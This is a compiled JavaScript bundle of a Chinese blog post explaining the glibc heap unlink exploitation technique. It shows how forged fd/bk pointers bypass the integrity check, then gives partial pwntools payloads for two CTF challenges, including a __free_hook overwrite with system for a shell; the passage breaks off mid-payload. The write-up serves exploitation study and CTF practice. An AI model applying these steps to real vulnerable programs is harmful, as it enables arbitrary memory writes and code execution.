import{_ as D}from"./ValaxyMain.vue_vue_type_style_index_0_lang-fe952921.js";import{_ as F,p as y,c as i,w as o,o as A,a as s,b as l,d as a,r as n,e as C}from"./app-a51598bf.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-9cc900c2.js";import"./YunCard.vue_vue_type_script_setup_true_lang-fac3e250.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-e8684ee8.js";const _="/images/pasted-183.png",d="/images/pasted-184.png",u="/images/pasted-185.png",h="/images/pasted-186.png",m="/images/pasted-187.png",g="/images/pasted-188.png",f="/images/pasted-189.png",k="/images/pasted-190.png",x="/images/pasted-191.png",b="/images/pasted-192.png",E="/images/pasted-193.png",v="/images/pasted-194.png",P="/images/pasted-195.png",B="/images/pasted-196.png",K="/images/pasted-197.png",w="/images/pasted-198.png",$="/images/pasted-199.png",z="/images/pasted-200.png",T="/images/pasted-201.png",I="/images/pasted-202.png",N="/images/pasted-203.png",V="/images/pasted-204.png",X="/images/pasted-205.png",j="/images/pasted-206.png",L="/images/pasted-207.png",S="/images/pasted-208.png",J="/images/pasted-209.png",O="/images/pasted-210.png",U="/images/pasted-211.png",Z="/images/pasted-212.png",M="/images/pasted-213.png",Y="/images/pasted-214.png",co=JSON.parse('{"title":"堆利用(二)之unlink","description":"","frontmatter":{"layout":"post","title":"堆利用(二)之unlink","tags":["unlink"],"categories":["二进制"],"author":"1ss4k","date":"2021-01-22T16:13:00.000Z"},"headers":[{"level":3,"title":"基础知识","slug":"基础知识","link":"#基础知识","children":[]},{"level":3,"title":"例题","slug":"例题","link":"#例题","children":[]}],"relativePath":"pages/posts/heap overflow unlink.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/heap overflow unlink.md","lastUpdated":1690730773000}'),c=JSON.parse('{"title":"堆利用(二)之unlink","description":"","frontmatter":{"layout":"post","title":"堆利用(二)之unlink","tags":["unlink"],"categories":["二进制"],"author":"1ss4k","date":"2021-01-22T16:13:00.000Z"},"headers":[{"level":3,"title":"基础知识","slug":"基础知识","link":"#基础知识","children":[]},{"level":3,"title":"例题","slug":"例题","link":"#例题","children":[]}],"relativePath":"pages/posts/heap overflow unlink.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/heap overflow unlink.md","lastUpdated":1690730773000}'),q={name:"pages/posts/heap overflow unlink.md",data(){return{data:c,frontmatter:c.frontmatter,$frontmatter:c.frontmatter}},setup(){y("pageData",c)}},G={id:"基础知识",tabindex:"-1"},H=s("p",null,"连续free的堆块，会被合并，放入unsorted bin中。",-1),Q=s("p",null,"之前unlink的宏定义",-1),R=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"#define"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"unlink"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"P"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"BK"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"FD"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}}," FD "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," P"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"fd"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#676E95","font-style":"italic"}},"                //FD = *P + 8;")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}}," BK "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," P"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"bk"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#676E95","font-style":"italic"}},"               // BK = *P + 12;")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}}," FD"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"bk "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," BK"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#676E95","font-style":"italic"}},"             //  FD + 12 = BK; ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}}," BK"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"fd "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," FD"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#676E95","font-style":"italic"}},"            //   BK + 8 = FD; ")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"}")])])])],-1),W=s("p",null,"相当于当前的P向它的前一个堆块合并。",-1),ss=s("p",null,"现在的unlink：",-1),ls=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"#define"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"unlink"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"P"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"BK"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"FD"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"{"),s("span",{style:{color:"#A6ACCD"}},"                                            ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"\\    FD "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," P"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"fd"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#A6ACCD"}},"                                                          ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"\\    BK "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," P"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"bk"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#A6ACCD"}},"                                                          ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"\\    "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"if"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"__builtin_expect"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD"}},"FD"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"bk "),s("span",{style:{color:"#89DDFF"}},"!="),s("span",{style:{color:"#A6ACCD"}}," P "),s("span",{style:{color:"#89DDFF"}},"||"),s("span",{style:{color:"#A6ACCD"}}," BK"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"fd "),s("span",{style:{color:"#89DDFF"}},"!="),s("span",{style:{color:"#A6ACCD"}}," P"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"))"),s("span",{style:{color:"#A6ACCD"}},"                ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  \\      "),s("span",{style:{color:"#82AAFF"}},"malloc_printerr"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD"}},"check_action"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"corrupted double-linked list"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," P"),s("span",{style:{color:"#89DDFF"}},");"),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"\\    "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"else"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"{"),s("span",{style:{color:"#F07178"}},"                                                               ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  \\      "),s("span",{style:{color:"#A6ACCD"}},"FD"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"bk"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," BK"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#F07178"}},"                                                       ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  \\      "),s("span",{style:{color:"#A6ACCD"}},"BK"),s("span",{style:{color:"#89DDFF"}},"->"),s("span",{style:{color:"#A6ACCD"}},"fd"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," FD"),s("span",{style:{color:"#89DDFF"}},";"),s("span",{style:{color:"#F07178"}},"                                                       ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"}")])])])],-1),os=s("p",null,"现在利用的条件：",-1),ts=s("p",null,[l("满足"),s("strong",null,"FD->bk = P && BK->fd = P")],-1),ns=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"define "),s("span",{style:{color:"#82AAFF"}},"unlink"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"P"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," BK"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," FD"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"{"),s("span",{style:{color:"#A6ACCD"}},"                                            "),s("span",{style:{color:"#89DDFF"}},"\\")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    FD = P->fd;                                   "),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}},"FD = 0x602268")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    BK = P->bk;                                   "),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}},"BK = 0x602270")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"if"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"__builtin_expect "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"FD->bk "),s("span",{style:{color:"#89DDFF"}},"!="),s("span",{style:{color:"#82AAFF"}}," P || BK->fd "),s("span",{style:{color:"#89DDFF"}},"!="),s("span",{style:{color:"#82AAFF"}}," P"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"))"),s("span",{style:{color:"#A6ACCD"}},"    "),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}},"FD->bk  = *(0x602268+0x18) | *(0x602280) = P ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}}," BK->fd = *(0x602270+0x10) = *(0x602280) = P ,绕过！              ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"             "),s("span",{style:{color:"#82AAFF"}},"malloc_printerr "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"check_action"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"corrupted double-linked list"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," P"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," AV"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},";")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    FD->bk = BK;                                  "),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}},"*(0x602268+0x18) | *(0x602280)  = 0x602270")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    BK->fd = FD;                                  "),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}}," *(0x602270+0x10) | *(0x602280) = 0x602268")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    ...")])])])],-1),es=s("p",null,"对于32位，fd设为(&P - 3X4)，bk设为(&P - 2 X 4)",-1),as=s("p",null,"对于64位，fd设为(&P - 3X8)，bk设为(&P - 2 X 8)",-1),cs=s("p",null,"最终的效果就是chunk里面写上了FD的值。",-1),ps=s("p",null,"前提：要求PIE没有开启！(PIE会使得基址可变)",-1),rs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"603430"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0000000000602048"),s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0000000000602050")])])])],-1),Ds=s("p",null,"以上分别是fd、bk位置的值。",-1),Fs=s("p",null,[s("img",{src:_,alt:"upload successful"})],-1),ys=s("p",null,"修改chunk1的pre_chunk_size字段和size字段，以便于在free(chunk1)的时候，可以合并我们构造的这个伪堆块。",-1),is=s("p",null,[l("语句"),s("code",null,"chunk1_hdr[0] = malloc_size;"),l("，将堆块1的pre_size设置为malloc_size的大小，即0x80。")],-1),As=s("p",null,[s("img",{src:d,alt:"upload successful"})],-1),Cs=s("p",null,[l("语句"),s("code",null,"chunk1_hdr[1] &= ~1;"),l("，与1进行异或，将最后的inuse位设为0。")],-1),_s=s("p",null,[s("img",{src:u,alt:"upload successful"})],-1),ds=s("p",null,"free chunk1之后",-1),us=s("p",null,[s("img",{src:h,alt:"upload successful"})],-1),hs=s("p",null,[s("img",{src:m,alt:"upload successful"})],-1),ms=s("p",null,"原来chunk0_ptr指向的值chunk0的位置，现在指向&chunk0_ptr-3的地方",-1),gs=s("p",null,[s("img",{src:g,alt:"upload successful"})],-1),fs=s("p",null,[s("code",null,"0x48+0x18 = 0x60")],-1),ks=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"chunk0_ptr"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F78C6C"}},"3"),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"uint64_t"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," victim_string"),s("span",{style:{color:"#676E95","font-style":"italic"}}," //其实就是chunk0_ptr[3] =chunk0_ptr[0] =  &victim_string")])])])],-1),xs=s("p",null,[s("img",{src:f,alt:"upload successful"})],-1),bs=s("p",null,[s("img",{src:k,alt:"upload successful"})],-1),Es=s("p",null,"此时再去修改chunk0[0]的值，改的是原来字符串的值",-1),vs=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"chunk0_ptr"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"0x4141414142424242LL"),s("span",{style:{color:"#89DDFF"}},";")])])])],-1),Ps=s("p",null,[s("img",{src:x,alt:"upload successful"})],-1),Bs=s("p",null,[l("即我们可以在 "),s("code",null,"&chunk"),l("中实现任意读写。")],-1),Ks={id:"例题",tabindex:"-1"},ws=s("p",null,"例题1:chunk",-1),$s=s("p",null,"add 3个块",-1),zs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"add"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"3"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"100"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"add"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"100"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"add"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"5"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"100"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),Ts=s("p",null,"查看真实的大小，发现是0x111",-1),Is=s("p",null,[s("img",{src:b,alt:"upload successful"})],-1),Ns=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"''")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"101"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#从0x603010开始，presize设为真实的size - 0x10")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"3"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#F78C6C"}},"30"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#填充")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"100"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"110"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"  "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#pre_inuse 设为0，presize设为0x100")])])])],-1),Vs=s("p",null,"下面往fake_chunk里面写fd指针的bk指针的值。",-1),Xs=s("p",null,[l("ida找到chunk的地址为0x602280，我们要合并的是3号块，地址是"),s("code",null,"0x602280 + 8*3")],-1),js=s("p",null,[s("img",{src:E,alt:"upload successful"})],-1),Ls=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"ptr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"602298")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"fd "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," ptr "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"bk "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," ptr "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"10")])])])],-1),Ss=s("p",null,"此时堆块已经伪造好了。",-1),Js=s("p",null,[s("img",{src:v,alt:"upload successful"})],-1),Os=s("p",null,"fd->bk = 0x602280 + 0x18 = 0x602298",-1),Us=s("p",null,"bk->fd = 0x602288 + 0x10 = 0x602298",-1),Zs=s("p",null,"所以绕过了检查。接下来free下一个堆块。",-1),Ms=s("p",null,"效果是：两个堆块合并，所以前一个堆块大小变大了，并且fd和bk的值都变了。",-1),Ys=s("p",null,[s("img",{src:P,alt:"upload successful"})],-1),qs=s("p",null,"并且往原来的地址0x602298处 写入了 值0x602280 。",-1),Gs=s("p",null,[s("img",{src:B,alt:"upload successful"})],-1),Hs=s("p",null,[l("再次edit 3号块，就会edit 0x602280地址处的内容。"),s("code",null,"edit(3,0x20,'AAA')")],-1),Qs=s("p",null,[s("img",{src:K,alt:"upload successful"})],-1),Rs=s("p",null,[l("接下来往0x602280处写入free_hook的地址。"),s("code",null,'free_hook = libc_base + libc.sym["__free_hook"]')],-1),Ws=s("p",null,"再往free_hook里面写入system",-1),sl=s("p",null,"再次free一个堆块的时候，参数设置为/bin/sh，即可getshell。",-1),ll=s("p",null,"例题2: uunlink",-1),ol=s("p",null,"注意：此题没有show功能。",-1),tl=s("p",null,[s("img",{src:w,alt:"upload successful"})],-1),nl=s("p",null,[l("先malloc几个堆块。然后ida中找到chunk的地址，就是我们的ptr。此处是"),s("code",null,"0x602300")],-1),el=s("p",null,[s("img",{src:$,alt:"upload successful"})],-1),al=s("p",null,"下面构造fake_chunk。构造好之后，ida查看delete函数的地址是400BA0，free函数的是0x400730，设断点进行调试。",-1),cl=s("p",null,"有以下两种方式",-1),pl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#debug(0x400730,0) ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},'#gdb.attach(p,"b *0x400BA0")')])])])],-1),rl=s("p",null,"free之后，堆块内容如下",-1),Dl=s("p",null,[s("img",{src:z,alt:"upload successful"})],-1),Fl=s("p",null,"在此edit 0号块，其实是从 0x602300 - 0x18处开始编辑的。",-1),yl=s("p",null,[s("img",{src:T,alt:"upload successful"})],-1),il=s("p",null,"调试的时候发现调用了",-1),Al=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"atoi_got "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," elf"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"got"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"atoi"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#0x602060")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"free_got "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," elf"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"got"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"free"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#0x602018")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"puts_plt "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," elf"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sym"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"puts"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#0x400740")])])])],-1),Cl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"''")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"a"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#A6ACCD"}},"   "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#填充")]),l(`
